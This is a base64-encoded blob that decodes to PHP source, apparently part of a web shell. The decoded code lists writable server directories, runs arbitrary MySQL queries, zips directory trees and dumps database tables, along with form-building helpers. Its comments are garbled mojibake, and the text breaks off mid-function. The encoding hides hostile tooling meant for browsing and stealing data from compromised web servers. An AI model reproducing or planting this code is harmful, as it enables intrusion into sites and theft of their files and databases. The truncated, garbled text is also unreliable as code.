QluKAmdCT4oCa0JLQhtCT0ZPQldCF0JPRk9CVINCT0ZPQktCFIA0KZnVuY3Rpb24gZ2V0Y2ZnKCR2YXJuYW1lKSB7IA0KICAgICRyZXN1bHQgPSBnZXRfY2ZnX3ZhcigkdmFybmFtZSk7IA0KICAgIGlmICgkcmVzdWx0ID09IDApIHsgDQogICAgICAgIHJldHVybiAnTm8nOyANCiAgICB9IGVsc2VpZiAoJHJlc3VsdCA9PSAxKSB7IA0KICAgICAgICByZXR1cm4gJ1llcyc7IA0KICAgIH0gZWxzZSB7IA0KICAgICAgICByZXR1cm4gJHJlc3VsdDsgDQogICAgfSANCn0gDQoNCi8vINCT4oCa0JLRmNCT0ZPQksKs0JPigJrQktCG0JPRk9CSwqnQk+KAmtCS0ZTQk+KAmtCS0IfQk9GT0JUg0JPRk9CS0IXQk9GT0LLQgtCO0JPRk9CSwqnQk+KAmtCS0ZfQk9GT0JLCtiANCmZ1bmN0aW9uIGdldGZ1bigkZnVuTmFtZSkgeyANCiAgICByZXR1cm4gKGZhbHNlICE9PSBmdW5jdGlvbl9leGlzdHMoJGZ1bk5hbWUpKSA/ICdZZXMnIDogJ05vJzsgDQp9IA0KDQpmdW5jdGlvbiBHZXRMaXN0KCRkaXIpeyANCiAgICBnbG9iYWwgJGRpcmRhdGEsJGosJG5vd3BhdGg7IA0KICAgICEkaiAmJiAkaj0xOyANCiAgICBpZiAoJGRoID0gQG9wZW5kaXIoJGRpcikpIHsgDQogICAgICAgIHdoaWxlICgkZmlsZSA9IHJlYWRkaXIoJGRoKSkgeyANCiAgICAgICAgICAgICRmPXN0cl9yZXBsYWNlKCcvLycsJy8nLCRkaXIuJy8nLiRmaWxlKTsgDQogICAgICAgICAgICBpZigkZmlsZSE9Jy4nICYmICRmaWxlIT0nLi4nICYmIGlzX2RpcigkZikpeyANCiAgICAgICAgICAgICAgICBpZiAoaXNfd3JpdGFibGUoJGYpKSB7IA0KICAgICAgICAgICAgICAgICAgICAkZGlyZGF0YVskal1bJ2ZpbGVuYW1lJ109c3RyX3JlcGxhY2UoJG5vd3BhdGgsJycsJGYpOyANCiAgICAgICAgICAgICAgICAgICAgJGRpcmRhdGFbJGpdWydtdGltZSddPUBkYXRlKCdZLW0tZCBIOmk6cycsZmlsZW10aW1lKCRmKSk7IA0KICAgICAgICAgICAgICAgICAgICAkZGlyZGF0YVskal1bJ2RpcmNobW9kJ109Z2V0Q2htb2QoJGYpOyANCiAgICAgICAgICAgICAgICAgICAgJGRpcmRhdGFbJGpdWydkaXJwZXJtJ109Z2V0UGVybXMoJGYpOyANCiAgICAgICAgICAgICAgICAgICAgJGRpcmRhdGFbJGpdWydkaXJsaW5rJ109dWUoJGRpcik7IA0KICAgICAgICAgICAgICAgICAgICAkZGlyZGF0YVskal1bJ3NlcnZlcl9saW5rJ109JGY7IA0KICAgICAgICAgICAgICAgICAgICAkZGlyZGF0YVskal1bJ2NsaWVudF9saW5rJ109dWUoJGYpOyANCiAgICAgICAgICAgICAgICAgICAgJGorKzsgDQogICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICBHZXRMaXN0KCRmKTsgDQogICAgICAgICAgICB9IA0KICAgICAgICB9IA0KICAgICAgICBjbG9zZWRpcigkZGgpOyANCiAgICAgICAgY2xlYXJzdGF0Y2FjaGUoKTsgDQogICAgICAgIHJldHVybiAkZGlyZGF0YTsgDQogICAgfSBlbHNlIHsgDQogICAgICAgIHJldHVybiBhcnJheSgpOyANCiAgICB9IA0KfSANCg0KZnVuY3Rpb24gcXkoJHNxbCkgeyAgDQogICAgLy9lY2hvICRzcWwuJzxicj4nOyANCiAgICAkcmVzID0gJGVycm9yID0gJyc7IA0KICAgIGlmKCEkcmVzID0gQG15c3FsX3F1ZXJ5KCRzcWwpKSB7ICANCiAgICAgICAgcmV0dXJuIDA7IA0KICAgIH0gZWxzZSBpZihpc19yZXNvdXJjZSgkcmVzKSkgeyANCiAgICAgICAgcmV0dXJuIDE7ICANCiAgICB9IGVsc2UgeyANCiAgICAgICAgcmV0dXJuIDI7IA0KICAgIH0gICAgIA0KICAgIHJldHVybiAwOyANCn0gDQoNCmZ1bmN0aW9uIHEoJHNxbCkgeyAgDQogICAgcmV0dXJuIEBteXNxbF9xdWVyeSgkc3FsKTsgDQp9IA0KDQpmdW5jdGlvbiBmcigkcXkpeyANCiAgICBteXNxbF9mcmVlX3Jlc3VsdCgkcXkpOyANCn0gDQoNCmZ1bmN0aW9uIHNpemVjb3VudCgkc2l6ZSkgeyANCiAgICBpZigkc2l6ZSA+IDEwNzM3NDE4MjQpIHsgDQogICAgICAgICRzaXplID0gcm91bmQoJHNpemUgLyAxMDczNzQxODI0ICogMTAwKSAvIDEwMCAuICcgRyc7IA0KICAgIH0gZWxzZWlmKCRzaXplID4gMTA0ODU3NikgeyANCiAgICAgICAgJHNpemUgPSByb3VuZCgkc2l6ZSAvIDEwNDg1NzYgKiAxMDApIC8gMTAwIC4gJyBNJzsgDQogICAgfSBlbHNlaWYoJHNpemUgPiAxMDI0KSB7IA0KICAgICAgICAkc2l6ZSA9IHJvdW5kKCRzaXplIC8gMTAyNCAqIDEwMCkgLyAxMDAgLiAnIEsnOyANCiAgICB9IGVsc2UgeyANCiAgICAgICAgJHNpemUgPSAkc2l6ZSAuICcgQic7IA0KICAgIH0gDQogICAgcmV0dXJuICRzaXplOyANCn0gDQoNCi8vINCT0ZPQstCC77+90JPigJrQkuKEltCT0ZPQstCC4oSW0JPRk9CSwrXQk+KAmtCS0pHQk9GT0JLQhtCT4oCa0JLCsNCT0ZPQktGY0JPRk9Cy4oCawqzQk9GT0JIgIA0KY2xhc3MgUEhQWmlweyANCiAgICB2YXIgJG91dD0nJzsgDQogICAgZnVuY3Rpb24gUEhQWmlwKCRkaXIpICAgIHsgDQogICAgICAgIGlmIChAZnVuY3Rpb25fZXhpc3RzKCdnemNvbXByZXNzJykpICAgIHsgDQogICAgICAgICAgICAkY3VyZGlyID0gZ2V0Y3dkKCk7IA0KICAgICAgICAgICAgaWYgKGlzX2FycmF5KCRkaXIpKSAkZmlsZWxpc3QgPSAkZGlyOyANCiAgICAgICAgICAgIGVsc2V7IA0KICAgICAgICAgICAgICAgICRmaWxlbGlzdD0kdGhpcyAtPiBHZXRGaWxlTGlzdCgkZGlyKTsvL9CT0ZPQldCF0JPRk9Cy0ILRm9CT4oCa0JLRmNCT0ZPQktGV0JPRk9C/0ZfQhdCT0ZPQv9GX0IXQk+KAmtCSwrHQk9GT0JIgDQogICAgICAgICAgICAgICAgZm9yZWFjaCgkZmlsZWxpc3QgYXMgJGs9PiR2KSAkZmlsZWxpc3RbXT1zdWJzdHIoJHYsc3RybGVuKCRkaXIpKzEpOyANCiAgICAgICAgICAgIH0gDQogICAgICAgICAgICBpZiAoKCFlbXB0eSgkZGlyKSkmJighaXNfYXJyYXkoJGRpcikpJiYoZmlsZV9leGlzdHMoJGRpcikpKSBjaGRpcigkZGlyKTsgDQogICAgICAgICAgICBlbHNlIGNoZGlyKCRjdXJkaXIpOyANCiAgICAgICAgICAgIGlmIChjb3VudCgkZmlsZWxpc3QpPjApeyANCiAgICAgICAgICAgICAgICBmb3JlYWNoKCRmaWxlbGlzdCBhcyAkZmlsZW5hbWUpeyANCiAgICAgICAgICAgICAgICAgICAgaWYgKGlzX2ZpbGUoJGZpbGVuYW1lKSl7IA0KICAgICAgICAgICAgICAgICAgICAgICAgJGZkID0gZm9wZW4gKCRmaWxlbmFtZSwgJ3InKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAkY29udGVudCA9IEBmcmVhZCAoJGZkLCBmaWxlc2l6ZSgkZmlsZW5hbWUpKTsgDQogICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UgKCRmZCk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzX2FycmF5KCRkaXIpKSAkZmlsZW5hbWUgPSBiYXNlbmFtZSgkZmlsZW5hbWUpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzIC0+IGFkZEZpbGUoJGNvbnRlbnQsICRmaWxlbmFtZSk7IA0KICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgJHRoaXMtPm91dCA9ICR0aGlzIC0+IGZpbGUoKTsgDQogICAgICAgICAgICAgICAgY2hkaXIoJGN1cmRpcik7IA0KICAgICAgICAgICAgfSANCiAgICAgICAgICAgIHJldHVybiAxOyANCiAgICAgICAgfSANCiAgICAgICAgZWxzZSByZXR1cm4gMDsgDQogICAgfSANCg0KICAgIC8vINCT4oCa0JLCu9CT0ZPQksKx0JPigJrQksK10JPRk9CW4oCZ0JPRk9Cy0ILigJzQk+KAmtCS0ZHQk+KAmtCSwrbQk+KAmtCS0IHQk9GT0LLQgtGb0JPigJrQktGX0JPRk9Cy0ILRmdCT4oCa0JLRmNCT0ZPQldCF0JPRk9Cy0ILRm9CT4oCa0JLRmNCT0ZPQktGV0JPRk9C/0ZfQhdCT0ZPQv9GX0IXQk+KAmtCSwrHQk9GT0JIgDQogICAgZnVuY3Rpb24gR2V0RmlsZUxpc3QoJGRpcil7IA0KICAgICAgICBzdGF0aWMgJGE7IA0KICAgICAgICBpZiAoaXNfZGlyKCRkaXIpKSB7IA0KICAgICAgICAgICAgaWYgKCRkaCA9IG9wZW5kaXIoJGRpcikpIHsgDQogICAgICAgICAgICAgICAgd2hpbGUgKCRmaWxlID0gcmVhZGRpcigkZGgpKSB7IA0KICAgICAgICAgICAgICAgICAgICBpZigkZmlsZSE9Jy4nICYmICRmaWxlIT0nLi4nKXsgDQogICAgICAgICAgICAgICAgICAgICAgICAkZj0kZGlyIC4nLycuICRmaWxlOyANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKGlzX2RpcigkZikpICR0aGlzLT5HZXRGaWxlTGlzdCgkZik7IA0KICAgICAgICAgICAgICAgICAgICAgICAgJGFbXT0kZjsgDQogICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICBjbG9zZWRpcigkZGgpOyANCiAgICAgICAgICAgIH0gDQogICAgICAgIH0gDQogICAgICAgIHJldHVybiAkYTsgDQogICAgfSANCg0KICAgIHZhciAkZGF0YXNlYyAgICAgID0gYXJyYXkoKTsgDQogICAgdmFyICRjdHJsX2RpciAgICAgPSBhcnJheSgpOyANCiAgICB2YXIgJGVvZl9jdHJsX2RpciA9ICJceDUwXHg0Ylx4MDVceDA2XHgwMFx4MDBceDAwXHgwMCI7IA0KICAgIHZhciAkb2xkX29mZnNldCAgID0gMDsgDQoNCiAgICBmdW5jdGlvbiB1bml4MkRvc1RpbWUoJHVuaXh0aW1lID0gMCkgeyANCiAgICAgICAgJHRpbWVhcnJheSA9ICgkdW5peHRpbWUgPT0gMCkgPyBnZXRkYXRlKCkgOiBnZXRkYXRlKCR1bml4dGltZSk7IA0KICAgICAgICBpZiAoJHRpbWVhcnJheVsneWVhciddIDwgMTk4MCkgeyANCiAgICAgICAgICAgICR0aW1lYXJyYXlbJ3llYXInXSAgICA9IDE5ODA7IA0KICAgICAgICAgICAgJHRpbWVhcnJheVsnbW9uJ10gICAgID0gMTsgDQogICAgICAgICAgICAkdGltZWFycmF5WydtZGF5J10gICAgPSAxOyANCiAgICAgICAgICAgICR0aW1lYXJyYXlbJ2hvdXJzJ10gICA9IDA7IA0KICAgICAgICAgICAgJHRpbWVhcnJheVsnbWludXRlcyddID0gMDsgDQogICAgICAgICAgICAkdGltZWFycmF5WydzZWNvbmRzJ10gPSAwOyANCiAgICAgICAgfSAvLyBlbmQgaWYgDQogICAgICAgIHJldHVybiAoKCR0aW1lYXJyYXlbJ3llYXInXSAtIDE5ODApIDw8IDI1KSB8ICgkdGltZWFycmF5Wydtb24nXSA8PCAyMSkgfCAoJHRpbWVhcnJheVsnbWRheSddIDw8IDE2KSB8IA0KICAgICAgICAgICAgICAgICgkdGltZWFycmF5Wydob3VycyddIDw8IDExKSB8ICgkdGltZWFycmF5WydtaW51dGVzJ10gPDwgNSkgfCAoJHRpbWVhcnJheVsnc2Vjb25kcyddID4+IDEpOyANCiAgICB9IA0KDQogICAgZnVuY3Rpb24gYWRkRmlsZSgkZGF0YSwgJG5hbWUsICR0aW1lID0gMCkgeyANCiAgICAgICAgJG5hbWUgPSBzdHJfcmVwbGFjZSgnXFwnLCAnLycsICRuYW1lKTsgDQoNCiAgICAgICAgJGR0aW1lID0gZGVjaGV4KCR0aGlzLT51bml4MkRvc1RpbWUoJHRpbWUpKTsgDQogICAgICAgICRoZXhkdGltZSAgICA9ICdceCcgLiAkZHRpbWVbNl0gLiAkZHRpbWVbN10gDQogICAgICAgICAgICAgICAgICAgIC4gJ1x4JyAuICRkdGltZVs0XSAuICRkdGltZVs1XSANCiAgICAgICAgICAgICAgICAgICAgLiAnXHgnIC4gJGR0aW1lWzJdIC4gJGR0aW1lWzNdIA0KICAgICAgICAgICAgICAgICAgICAuICdceCcgLiAkZHRpbWVbMF0gLiAkZHRpbWVbMV07IA0KICAgICAgICBldmFsKCckaGV4ZHRpbWUgPSAiJyAuICRoZXhkdGltZSAuICciOycpOyANCiAgICAgICAgJGZyICAgID0gIlx4NTBceDRiXHgwM1x4MDQiOyANCiAgICAgICAgJGZyICAgIC49ICJceDE0XHgwMCI7IA0KICAgICAgICAkZnIgICAgLj0gIlx4MDBceDAwIjsgDQogICAgICAgICRmciAgICAuPSAiXHgwOFx4MDAiOyANCiAgICAgICAgJGZyICAgIC49ICRoZXhkdGltZTsgDQoNCiAgICAgICAgJHVuY19sZW4gPSBzdHJsZW4oJGRhdGEpOyANCiAgICAgICAgJGNyYyA9IGNyYzMyKCRkYXRhKTsgDQogICAgICAgICR6ZGF0YSA9IGd6Y29tcHJlc3MoJGRhdGEpOyANCiAgICAgICAgJGNfbGVuID0gc3RybGVuKCR6ZGF0YSk7IA0KICAgICAgICAkemRhdGEgPSBzdWJzdHIoc3Vic3RyKCR6ZGF0YSwgMCwgc3RybGVuKCR6ZGF0YSkgLSA0KSwgMik7IA0KICAgICAgICAkZnIgLj0gcGFjaygnVicsICRjcmMpOyANCiAgICAgICAgJGZyIC49IHBhY2soJ1YnLCAkY19sZW4pOyANCiAgICAgICAgJGZyIC49IHBhY2soJ1YnLCAkdW5jX2xlbik7IA0KICAgICAgICAkZnIgLj0gcGFjaygndicsIHN0cmxlbigkbmFtZSkpOyANCiAgICAgICAgJGZyIC49IHBhY2soJ3YnLCAwKTsgDQogICAgICAgICRmciAuPSAkbmFtZTsgDQogICAgICAgICRmciAuPSAkemRhdGE7IA0KICAgICAgICAkZnIgLj0gcGFjaygnVicsICRjcmMpOyANCiAgICAgICAgJGZyIC49IHBhY2soJ1YnLCAkY19sZW4pOyANCiAgICAgICAgJGZyIC49IHBhY2soJ1YnLCAkdW5jX2xlbik7IA0KDQogICAgICAgICR0aGlzIC0+IGRhdGFzZWNbXSA9ICRmcjsgDQogICAgICAgICRuZXdfb2Zmc2V0ID0gc3RybGVuKGltcGxvZGUoJycsICR0aGlzLT5kYXRhc2VjKSk7IA0KDQogICAgICAgICRjZHJlYyA9ICJceDUwXHg0Ylx4MDFceDAyIjsgDQogICAgICAgICRjZHJlYyAuPSAiXHgwMFx4MDAiOyANCiAgICAgICAgJGNkcmVjIC49ICJceDE0XHgwMCI7IA0KICAgICAgICAkY2RyZWMgLj0gIlx4MDBceDAwIjsgDQogICAgICAgICRjZHJlYyAuPSAiXHgwOFx4MDAiOyANCiAgICAgICAgJGNkcmVjIC49ICRoZXhkdGltZTsgDQogICAgICAgICRjZHJlYyAuPSBwYWNrKCdWJywgJGNyYyk7IA0KICAgICAgICAkY2RyZWMgLj0gcGFjaygnVicsICRjX2xlbik7IA0KICAgICAgICAkY2RyZWMgLj0gcGFjaygnVicsICR1bmNfbGVuKTsgDQogICAgICAgICRjZHJlYyAuPSBwYWNrKCd2Jywgc3RybGVuKCRuYW1lKSApOyANCiAgICAgICAgJGNkcmVjIC49IHBhY2soJ3YnLCAwICk7IA0KICAgICAgICAkY2RyZWMgLj0gcGFjaygndicsIDAgKTsgDQogICAgICAgICRjZHJlYyAuPSBwYWNrKCd2JywgMCApOyANCiAgICAgICAgJGNkcmVjIC49IHBhY2soJ3YnLCAwICk7IA0KICAgICAgICAkY2RyZWMgLj0gcGFjaygnVicsIDMyICk7IA0KICAgICAgICAkY2RyZWMgLj0gcGFjaygnVicsICR0aGlzIC0+IG9sZF9vZmZzZXQgKTsgDQogICAgICAgICR0aGlzIC0+IG9sZF9vZmZzZXQgPSAkbmV3X29mZnNldDsgDQogICAgICAgICRjZHJlYyAuPSAkbmFtZTsgDQoNCiAgICAgICAgJHRoaXMgLT4gY3RybF9kaXJbXSA9ICRjZHJlYzsgDQogICAgfSANCg0KICAgIGZ1bmN0aW9uIGZpbGUoKSB7IA0KICAgICAgICAkZGF0YSAgICA9IGltcGxvZGUoJycsICR0aGlzIC0+IGRhdGFzZWMpOyANCiAgICAgICAgJGN0cmxkaXIgPSBpbXBsb2RlKCcnLCAkdGhpcyAtPiBjdHJsX2Rpcik7IA0KICAgICAgICByZXR1cm4gJGRhdGEgLiAkY3RybGRpciAuICR0aGlzIC0+IGVvZl9jdHJsX2RpciAuIHBhY2soJ3YnLCBzaXplb2YoJHRoaXMgLT4gY3RybF9kaXIpKSAuIHBhY2soJ3YnLCBzaXplb2YoJHRoaXMgLT4gY3RybF9kaXIpKSAuICAgIHBhY2soJ1YnLCBzdHJsZW4oJGN0cmxkaXIpKSAuIHBhY2soJ1YnLCBzdHJsZW4oJGRhdGEpKSAuICJceDAwXHgwMCI7IA0KICAgIH0gDQp9IA0KDQovLyDQk+KAmtCSwrHQk+KAmtCS0ZHQk+KAmtCSwrfQk9GT0L/Rl9CF0JPRk9CVINCT0ZPQktCF0JPigJrQktGV0JPRk9C/0ZfQhdCT4oCa0JLRl9CT0ZPQktGeIA0KZnVuY3Rpb24gc3FsZHVtcHRhYmxlKCR0YWJsZSwgJGZwPTApIHsgDQogICAgJHRhYmxlZHVtcCA9ICJEUk9QIFRBQkxFIElGIEVYSVNUUyAkdGFibGU7XG4iOyANCiAgICAkdGFibGVkdW1wIC49ICJDUkVBVEUgVEFCTEUgJHRhYmxlIChcbiI7IA0KDQogICAgJGZpcnN0ZmllbGQ9MTsgDQoNCiAgICAkZmllbGRzID0gcSgiU0hPVyBGSUVMRFMgRlJPTSAkdGFibGUiKTsgDQogICAgd2hpbGUgKCRmaWVsZCA9IG15c3FsX2ZldGNoX2FycmF5KCRmaWVsZHMpKSB7IA0KICAgICAgICBpZiAoISRmaXJzdGZpZWxkKSB7IA0KICAgICAgICAgICAgJHRhYmxlZHVtcCAuPSAiLFxuIjsgDQogICAgICAgIH0gZWxzZSB7IA0KICAgICAgICAgICAgJGZpcnN0ZmllbGQ9MDsgDQogICAgICAgIH0gDQogICAgICAgICR0YWJsZWR1bXAgLj0gIiAgICRmaWVsZFtGaWVsZF0gJGZpZWxkW1R5cGVdIjsgDQogICAgICAgIGlmICghZW1wdHkoJGZpZWxkWyJEZWZhdWx0Il0pKSB7IA0KICAgICAgICAgICAgJHRhYmxlZHVtcCAuPSAiIERFRkFVTFQgJyRmaWVsZFtEZWZhdWx0XSciOyANCiAgICAgICAgfSANCiAgICAgICAgaWYgKCRmaWVsZFsnTnVsbCddICE9ICJZRVMiKSB7IA0KICAgICAgICAgICAgJHRhYmxlZHVtcCAuPSAiIE5PVCBOVUxMIjsgDQogICAgICAgIH0gDQogICAgICAgIGlmICgkZmllbGRbJ0V4dHJhJ10gIT0gIiIpIHsgDQogICAgICAgICAgICAkdGFibGVkdW1wIC49ICIgJGZpZWxkW0V4dHJhXSI7IA0KICAgICAgICB9IA0KICAgIH0gDQogICAgZnIoJGZpZWxkcyk7IA0KDQogICAgJGtleXMgPSBxKCJTSE9XIEtFWVMgRlJPTSAkdGFibGUiKTsgDQogICAgd2hpbGUgKCRrZXkgPSBteXNxbF9mZXRjaF9hcnJheSgka2V5cykpIHsgDQogICAgICAgICRrbmFtZT0ka2V5WydLZXlfbmFtZSddOyANCiAgICAgICAgaWYgKCRrbmFtZSAhPSAiUFJJTUFSWSIgJiYgJGtleVsnTm9uX3VuaXF1ZSddID09IDApIHsgDQogICAgICAgICAgICAka25hbWU9IlVOSVFVRXwka25hbWUiOyANCiAgICAgICAgfSANCiAgICAgICAgaWYoIWlzX2FycmF5KCRpbmRleFska25hbWVdKSkgeyANCiAgICAgICAgICAgICRpbmRleFska25hbWVdID0gYXJyYXkoKTsgDQogICAgICAgIH0gDQogICAgICAgICRpbmRleFska25hbWVdW10gPSAka2V5WydDb2x1bW5fbmFtZSddOyANCiAgICB9IA0KICAgIGZyKCRrZXlzKTsgDQoNCiAgICB3aGlsZShsaXN0KCRrbmFtZSwgJGNvbHVtbnMpID0gQGVhY2goJGluZGV4KSkgeyANCiAgICAgICAgJHRhYmxlZHVtcCAuPSAiLFxuIjsgDQogICAgICAgICRjb2xuYW1lcz1pbXBsb2RlKCRjb2x1bW5zLCIsIik7IA0KDQogICAgICAgIGlmICgka25hbWUgPT0gIlBSSU1BUlkiKSB7IA0KICAgICAgICAgICAgJHRhYmxlZHVtcCAuPSAiICAgUFJJTUFSWSBLRVkgKCRjb2xuYW1lcykiOyANCiAgICAgICAgfSBlbHNlIHsgDQogICAgICAgICAgICBpZiAoc3Vic3RyKCRrbmFtZSwwLDYpID09ICJVTklRVUUiKSB7IA0KICAgICAgICAgICAgICAgICRrbmFtZT1zdWJzdHIoJGtuYW1lLDcpOyANCiAgICAgICAgICAgIH0gDQogICAgICAgICAgICAkdGFibGVkdW1wIC49ICIgICBLRVkgJGtuYW1lICgkY29sbmFtZXMpIjsgDQogICAgICAgIH0gDQogICAgfSANCg0KICAgICR0YWJsZWR1bXAgLj0gIlxuKTtcblxuIjsgDQogICAgaWYgKCRmcCkgeyANCiAgICAgICAgZndyaXRlKCRmcCwkdGFibGVkdW1wKTsgDQogICAgfSBlbHNlIHsgDQogICAgICAgIGVjaG8gJHRhYmxlZHVtcDsgDQogICAgfSANCg0KICAgICRyb3dzID0gcSgiU0VMRUNUICogRlJPTSAkdGFibGUiKTsgDQogICAgJG51bWZpZWxkcyA9IG15c3FsX251bV9maWVsZHMoJHJvd3MpOyANCiAgICB3aGlsZSAoJHJvdyA9IG15c3FsX2ZldGNoX2FycmF5KCRyb3dzKSkgeyANCiAgICAgICAgJHRhYmxlZHVtcCA9ICJJTlNFUlQgSU5UTyAkdGFibGUgVkFMVUVTKCI7IA0KDQogICAgICAgICRmaWVsZGNvdW50ZXI9LTE7IA0KICAgICAgICAkZmlyc3RmaWVsZD0xOyANCiAgICAgICAgd2hpbGUgKCsrJGZpZWxkY291bnRlcjwkbnVtZmllbGRzKSB7IA0KICAgICAgICAgICAgaWYgKCEkZmlyc3RmaWVsZCkgeyANCiAgICAgICAgICAgICAgICAkdGFibGVkdW1wLj0iLCAiOyANCiAgICAgICAgICAgIH0gZWxzZSB7IA0KICAgICAgICAgICAgICAgICRmaXJzdGZpZWxkPTA7IA0KICAgICAgICAgICAgfSANCg0KICAgICAgICAgICAgaWYgKCFpc3NldCgkcm93WyRmaWVsZGNvdW50ZXJdKSkgeyANCiAgICAgICAgICAgICAgICAkdGFibGVkdW1wIC49ICJOVUxMIjsgDQogICAgICAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgICAgICAkdGFibGVkdW1wIC49ICInIi5teXNxbF9lc2NhcGVfc3RyaW5nKCRyb3dbJGZpZWxkY291bnRlcl0pLiInIjsgDQogICAgICAgICAgICB9IA0KICAgICAgICB9IA0KDQogICAgICAgICR0YWJsZWR1bXAgLj0gIik7XG4iOyANCg0KICAgICAgICBpZiAoJGZwKSB7IA0KICAgICAgICAgICAgZndyaXRlKCRmcCwkdGFibGVkdW1wKTsgDQogICAgICAgIH0gZWxzZSB7IA0KICAgICAgICAgICAgZWNobyAkdGFibGVkdW1wOyANCiAgICAgICAgfSANCiAgICB9IA0KICAgIGZyKCRyb3dzKTsgDQogICAgaWYgKCRmcCkgeyANCiAgICAgICAgZndyaXRlKCRmcCwiXG4iKTsgDQogICAgfSBlbHNlIHsgDQogICAgICAgIGVjaG8gIlxuIjsgDQogICAgfSANCn0gDQoNCmZ1bmN0aW9uIHVlKCRzdHIpeyANCiAgICByZXR1cm4gdXJsZW5jb2RlKCRzdHIpOyANCn0gDQoNCmZ1bmN0aW9uIHAoJHN0cil7IA0KICAgIGVjaG8gJHN0ci4iXG4iOyANCn0gDQoNCmZ1bmN0aW9uIHRiaGVhZCgpIHsgDQogICAgcCgnPHRhYmxlIHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSI0IiBjZWxsc3BhY2luZz0iMCI+Jyk7IA0KfSANCmZ1bmN0aW9uIHRiZm9vdCgpeyANCiAgICBwKCc8L3RhYmxlPicpOyANCn0gDQoNCmZ1bmN0aW9uIG1ha2VoaWRlKCRuYW1lLCR2YWx1ZT0nJyl7IA0KICAgIHAoIjxpbnB1dCBpZD1cIiRuYW1lXCIgdHlwZT1cImhpZGRlblwiIG5hbWU9XCIkbmFtZVwiIHZhbHVlPVwiJHZhbHVlXCIgLz4iKTsgDQp9IA0KDQpmdW5jdGlvbiBtYWtlaW5wdXQoJGFyZyA9IGFycmF5KCkpeyANCiAgICAkYXJnWydzaXplJ10gPSAkYXJnWydzaXplJ10gPiAwID8gInNpemU9XCIkYXJnW3NpemVdXCIiIDogInNpemU9XCIxMDBcIiI7IA0KICAgICRhcmdbJ2V4dHJhJ10gPSAkYXJnWydleHRyYSddID8gJGFyZ1snZXh0cmEnXSA6ICcnOyANCiAgICAhJGFyZ1sndHlwZSddICYmICRhcmdbJ3R5cGUnXSA9ICd0ZXh0JzsgDQogICAgJGFyZ1sndGl0bGUnXSA9ICRhcmdbJ3RpdGxlJ10gPyAkYXJnWyd0aXRsZSddLic8YnIgLz4nIDogJyc7IA0KICAgICRhcmdbJ2NsYXNzJ10gPSAkYXJnWydjbGFzcyddID8gJGFyZ1snY2xhc3MnXSA6ICdpbnB1dCc7IA0KICAgIGlmICgkYXJnWyduZXdsaW5lJ10pIHsgDQogICAgICAgIHAoIjxwPiRhcmdbdGl0bGVdPGlucHV0IGNsYXNzPVwiJGFyZ1tjbGFzc11cIiBuYW1lPVwiJGFyZ1tuYW1lXVwiIGlkPVwiJGFyZ1tuYW1lXVwiIHZhbHVlPVwiJGFyZ1t2YWx1ZV1cIiB0eXBlPVwiJGFyZ1t0eXBlXVwiICRhcmdbc2l6ZV0gJGFyZ1tleHRyYV0gLz48L3A+Iik7IA0KICAgIH0gZWxzZSB7IA0KICAgICAgICBwKCIkYXJnW3RpdGxlXTxpbnB1dCBjbGFzcz1cIiRhcmdbY2xhc3NdXCIgbmFtZT1cIiRhcmdbbmFtZV1cIiBpZD1cIiRhcmdbbmFtZV1cIiB2YWx1ZT1cIiRhcmdbdmFsdWVdXCIgdHlwZT1cIiRhcmdbdHlwZV1cIiAkYXJnW3NpemVdICRhcmdbZXh0cmFdIC8+Iik7IA0KICAgIH0gDQp9IA0KDQpmdW5jdGlvbiBtYWtlc2VsZWN0KCRhcmcgPSBhcnJheSgpKXsgDQogICAgaWYgKCRhcmdbJ29uY2hhbmdlJ10pIHsgDQogICAgICAgICRvbmNoYW5nZSA9ICdvbmNoYW5nZT0iJy4kYXJnWydvbmNoYW5nZSddLiciJzsgDQogICAgfSANCiAgICAkYXJnWyd0aXRsZSddID0gJGFyZ1sndGl0bGUnXSA/ICRhcmdbJ3RpdGxlJ10gOiAnJzsgDQogICAgaWYgKCRhcmdbJ25ld2xpbmUnXSkgcCgnPHA+Jyk7IA0KICAgIHAoIiRhcmdbdGl0bGVdIDxzZWxlY3QgY2xhc3M9XCJpbnB1dFwiIGlkPVwiJGFyZ1tuYW1lXVwiIG5hbWU9XCIkYXJnW25hbWVdXCIgJG9uY2hhbmdlPiIpOyANCiAgICAgICAgaWYgKGlzX2FycmF5KCRhcmdbJ29wdGlvbiddKSkgeyANCiAgICAgICAgICAgIGZvcmVhY2ggKCRhcmdbJ29wdGlvbiddIGFzICRrZXk9PiR2YWx1ZSkgeyANCiAgICAgICAgICAgICAgICBpZiAoJGFyZ1snc2VsZWN0ZWQnXT09JGtleSkgeyANCiAgICAgICAgICAgICAgICAgICAgcCgiPG9wdGlvbiB2YWx1ZT1cIiRrZXlcIiBzZWxlY3RlZD4kdmFsdWU8L29wdGlvbj4iKTsgDQogICAgICAgICAgICAgICAgfSBlbHNlIHsgDQogICAgICAgICAgICAgICAgICAgIHAoIjxvcHRpb24gdmFsdWU9XCIka2V5XCI+JHZhbHVlPC9vcHRpb24+Iik7IA0KICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICB9IA0KICAgICAgICB9IA0KICAgIHAoIjwvc2VsZWN0PiIpOyANCiAgICBpZiAoJGFyZ1snbmV3bGluZSddKSBwKCc8L3A+Jyk7IA0KfSANCmZ1bmN0aW9uIGZvcm1oZWFkKCRhcmcgPSBhcnJheSgpKSB7IA0KICAgICEkYXJnWydtZXRob2QnXSAmJiAkYXJnWydtZXRob2QnXSA9ICdwb3N0JzsgDQogICAgISRhcmdbJ2FjdGlvbiddICYmICRhcmdbJ2FjdGlvbiddID0gJHNlbGY7IA0KICAgICRhcmdbJ3RhcmdldCddID0gJGFyZ1sndGFyZ2V0J10gPyAidGFyZ2V0PVwiJGFyZ1t0YXJnZXRdXCIiIDogJyc7IA0KICAgICEkYXJnWyduYW1lJ10gJiYgJGFyZ1snbmFtZSddID0gJ2Zvcm0xJzsgDQogICAgcCgiPGZvcm0gbmFtZT1cIiRhcmdbb